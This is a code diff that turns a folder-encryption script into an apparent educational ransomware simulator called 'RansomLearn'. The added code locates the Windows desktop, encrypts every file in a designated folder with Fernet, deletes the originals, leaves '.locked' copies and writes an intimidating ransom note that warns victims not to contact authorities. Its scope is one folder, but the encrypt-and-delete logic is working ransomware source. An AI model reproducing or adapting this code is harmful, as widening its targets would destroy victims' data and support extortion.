@@ -1,65 +1,99 @@
 import os
-import io
-import zipfile
-import base64
-import pyperclip
-from Crypto.Cipher import AES
-from Crypto.Random import get_random_bytes
+import glob
+from cryptography.fernet import Fernet
 
-FOLDER_PATH = "test"
-KEY_FILE = "encryption_key.key"
+def get_desktop_path():
+    user_profile = os.environ["USERPROFILE"]
+    onedrive_desktop = os.path.join(user_profile, "OneDrive", "Desktop")
+    default_desktop = os.path.join(user_profile, "Desktop")
+    return onedrive_desktop if os.path.exists(onedrive_desktop) else default_desktop
+
+desktop = get_desktop_path()
+ransom_folder = os.path.join(desktop, "RansomLearn")
+files_folder = os.path.join(ransom_folder, "Files")
+key_folder = os.path.join(ransom_folder, "Key")
+ransom_note_path = os.path.join(ransom_folder, "RansomNote.txt")
+key_file = os.path.join(key_folder, "encryption.key")
+passkey_file = os.path.join(ransom_folder, "passkey.txt")
+
+os.makedirs(files_folder, exist_ok=True)
+os.makedirs(key_folder, exist_ok=True)
 
 def generate_key():
-    """Generate and save a 32-byte AES key."""
-    key = get_random_bytes(32)
-    with open(KEY_FILE, "wb") as keyfile:
-        keyfile.write(key)
+    key = Fernet.generate_key()
+    with open(key_file, "wb") as f:
+        f.write(key)
     return key
 
 def load_key():
-    """Load AES key from file."""
-    if not os.path.exists(KEY_FILE):
-        return generate_key()
-    with open(KEY_FILE, "rb") as keyfile:
-        return keyfile.read()
+    if os.path.exists(key_file):
+        with open(key_file, "rb") as f:
+            return f.read()
+    return generate_key()
 
-def compress_folder():
-    """Compress the folder into an in-memory ZIP file."""
-    zip_buffer = io.BytesIO()
-    with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zipf:
-        for root, _, files in os.walk(FOLDER_PATH):
-            for file in files:
-                file_path = os.path.join(root, file)
-                arcname = os.path.relpath(file_path, FOLDER_PATH)
-                zipf.write(file_path, arcname)
-    return zip_buffer.getvalue()
+key = load_key()
+cipher = Fernet(key)
 
-def encrypt_data(data, key):
-    """Encrypt data using AES-256-CBC."""
-    iv = get_random_bytes(16)
-    cipher = AES.new(key, AES.MODE_CBC, iv)
-    pad_length = 16 - (len(data) % 16)
-    data += bytes([pad_length]) * pad_length  # PKCS7 padding
-    encrypted = cipher.encrypt(data)
-    return iv + encrypted  # Store IV with encrypted data
+def encrypt_files():
+    if not os.path.exists(files_folder):
+        exit(1)
 
-def store_in_clipboard(data):
-    """Encode data as Base64 and store in clipboard."""
-    encoded = base64.b64encode(data).decode()
-    pyperclip.copy(encoded)
-    print("✅ Encrypted data stored in clipboard!")
+    files = glob.glob(os.path.join(files_folder, "*"))
 
-def encrypt():
-    print("meow meow meow meowwwwwww")
-    if not os.path.exists(FOLDER_PATH):
-        print("Folder not found!")
-        return
-    
-    key = load_key()    
-    zip_data = compress_folder()
-    encrypted_data = encrypt_data(zip_data, key)
-    store_in_clipboard(encrypted_data)
-    
-    print(f"✅ {FOLDER_PATH} encrypted and stored in clipboard!")
-    
-encrypt()
+    for file_path in files:
+        if file_path.endswith(".locked") or file_path == key_file:
+            continue  
+
+        try:
+            with open(file_path, "rb") as f:
+                data = f.read()
+
+            encrypted_data = cipher.encrypt(data)
+
+            with open(file_path + ".locked", "wb") as f:
+                f.write(encrypted_data)
+
+            os.remove(file_path)
+
+        except:
+            pass
+
+def create_ransom_note():
+    ransom_note_content = """
+██     ██  █████  ██████  ███     ██ ██ ███    ██  ██████  
+██     ██ ██   ██ ██   ██ ████    ██ ██ ████   ██ ██       
+██  █  ██ ███████ █████   ██ ██  ██ ██ ██ ██  ██ ██   ███ 
+██ ███ ██ ██   ██ ██   ██ ██ ██ ██ ██ ██  ██ ██ ██    ██ 
+ ███ ███  ██   ██ ██   ██ ██   ████ ██ ██   ████  ██████  
+
+!!! YOUR FILES HAVE BEEN ENCRYPTED !!!
+
+All your important files in 'RansomLearn' have been locked using **military-grade encryption**.
+
+>>>> **How to recover your files?**
+Enter the **correct decryption key** in the RansomLearn interface.
+
+>>>> **What happens if you fail?**
+❌ Incorrect attempts may result in **permanent data loss**.  
+❌ Trying to remove this ransomware may corrupt your files.  
+
+⏳ **Time is running out!** ⏳
+
+!! DO NOT TRY AND ALERT ANY AUTHORITIES..FAILURE TO SUBMIT THE RANSOM WILL LEAD TO GRAVE CONSEQUENCES !!
+"""
+
+    if not os.path.exists(ransom_note_path):
+        with open(ransom_note_path, "w", encoding="utf-8") as f:
+            f.write(ransom_note_content)
+
+def create_passkey_file():
+    with open(passkey_file, "w") as f:
+        f.write("Ransom@Learn")
+
+if not os.path.exists(key_file):  
+    with open(key_file, "wb") as f:
+        f.write(key)
+
+encrypt_files()
+create_ransom_note()
+create_passkey_file()
